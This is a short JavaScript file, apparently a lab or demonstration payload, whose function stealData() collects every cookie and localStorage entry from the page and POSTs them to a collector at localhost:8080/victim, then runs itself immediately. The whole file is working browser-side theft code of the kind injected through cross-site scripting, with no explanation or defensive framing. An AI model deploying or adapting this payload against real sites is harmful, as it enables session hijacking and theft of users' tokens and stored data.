async function stealData() {
  const cookies = document.cookie
    ? Object.fromEntries(document.cookie.split("; ").map((c) => c.split("=")))
    : {};

  const localStorageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    localStorageData[key] = localStorage.getItem(key);
  }

  if (Object.keys(cookies).length || Object.keys(localStorageData).length) {
    const response = await fetch("http://localhost:8080/victim", {
      method: "POST",
      body: JSON.stringify({ cookies, localStorage: localStorageData }),
      headers: {
        "Content-Type": "application/json",
      },
    });

    const data = await response.json();
    console.log(data);
  } else {
    console.log("Could not steal anything. Your website is very secure.");
  }
}

stealData();
